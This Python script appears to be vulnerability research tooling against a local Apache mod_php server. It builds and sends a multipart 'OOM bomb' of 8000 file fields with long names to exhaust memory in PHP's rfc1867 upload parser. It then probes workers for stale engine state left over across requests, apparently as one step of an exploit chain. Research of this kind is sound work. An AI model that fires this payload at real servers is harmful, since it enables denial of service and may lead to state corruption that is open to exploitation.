#!/usr/bin/env python3
"""
Chain D EG() stale state verification for mod_php.

Tests whether OOM in rfc1867 multipart parser leaves stale EG() state
that persists to the next request on the same Apache prefork worker.

Usage: uv run oom_verify.py
"""
import socket
import sys
import time
import re


HOST = "127.0.0.1"
PORT = 18081


def http_get(path, timeout=5):
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    req = f"GET {path} HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n"
    s.sendall(req.encode())
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else resp
    return body.decode("latin1", "replace")


def send_oom_bomb(timeout=15):
    """Send multipart POST that triggers OOM in rfc1867_post_handler."""
    boundary = "OOMBOMB"
    parts = []
    # Need PHP_SESSION_UPLOAD_PROGRESS to activate rfc1867 callback
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n"
        f"oom_test\r\n"
    )
    # Many large file fields to exhaust memory_limit (32MB)
    for i in range(8000):
        fname = "A" * 500 + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts).encode("latin-1")

    req = (
        f"POST /index.php HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID=oomegtest\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((HOST, PORT), timeout=timeout)
    sent = 0
    while sent < len(req):
        chunk = req[sent:sent + 65536]
        s.sendall(chunk)
        sent += len(chunk)

    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()

    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
    body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
    return status, body


def get_pid(response_text):
    m = re.search(r"PID:\s*(\d+)", response_text)
    return int(m.group(1)) if m else None


def main():
    print("=" * 60)
    print("  Chain D: EG() Stale State Verification (mod_php)")
    print("=" * 60)
    print()

    # Step 0: Reset
    print("[0] Reset test state...")
    r = http_get("/oom_eg_test.php?action=reset")
    print(f"    {r.strip()}")

    # Step 1: Populate EG(objects_store) on a worker
    print("\n[1] Populating EG() state on Apache worker...")
    r = http_get("/oom_eg_test.php?action=populate")
    populate_pid = get_pid(r)
    print(f"    {r.strip()}")
    print(f"    Target PID: {populate_pid}")

    # Step 2: Send OOM bomb
    # We need this to hit a worker - any worker. On prefork, the OOM
    # should crash/bail the request but the worker survives for the next request.
    print(f"\n[2] Sending OOM bomb (8000 files x 500 byte names)...")
    status, body = send_oom_bomb()
    print(f"    Response: {status}")
    if body:
        body_text = body.decode("latin1", "replace")[:200]
        if "Fatal error" in body_text:
            print(f"    [+] OOM triggered!")
            # Extract the error message
            m = re.search(r"Fatal error.*?(?=<br|$)", body_text)
            if m:
                print(f"    Error: {m.group(0)[:100]}")
        elif "200 OK" in status:
            print(f"    [-] No OOM (200 OK)")
    else:
        print(f"    [+] No response (worker may have crashed)")

    time.sleep(0.5)

    # Step 3: Check state on each worker
    print(f"\n[3] Checking post-OOM state on workers...")
    seen_pids = set()
    for i in range(20):
        r = http_get("/oom_eg_test.php?action=check_post_oom")
        pid = get_pid(r)
        if pid and pid not in seen_pids:
            seen_pids.add(pid)
            print(f"\n    --- Worker PID {pid} ---")
            for line in r.strip().split("\n"):
                print(f"    {line}")
        if len(seen_pids) >= 6:  # All workers covered
            break

    # Step 4: Read the full logs
    print(f"\n[4] Reading destruct and test logs...")
    r = http_get("/oom_eg_test.php?action=check_post_oom")
    if "destruct log" in r:
        print(r[r.index("--- destruct log ---"):])

    print("\n" + "=" * 60)
    print("  Analysis")
    print("=" * 60)
    print("""
    If stale EG() theory holds, we should see:
    - TrackedObject destructors firing with DIFFERENT pids
      (created on one worker, destructed on another request cycle)
    - Or: destructors NOT firing at all after OOM (cleanup skipped)
    - Or: error_get_last showing stale error from OOM request
    """)


if __name__ == "__main__":
    main()
